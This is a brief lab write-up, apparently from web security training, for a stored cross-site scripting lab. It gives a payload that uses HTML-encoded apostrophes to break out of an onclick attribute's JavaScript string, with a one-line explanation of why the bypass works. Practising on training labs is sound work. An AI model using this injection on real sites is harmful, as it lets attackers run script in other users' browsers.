# Lab 20 — Stored XSS onclick HTML Entity Bypass (PRACTITIONER)

## Payload (website field)
```
http://foo?&apos;-alert(1)-&apos;
```
HTML entity `&apos;` is decoded by HTML parser before JS sees the onclick.
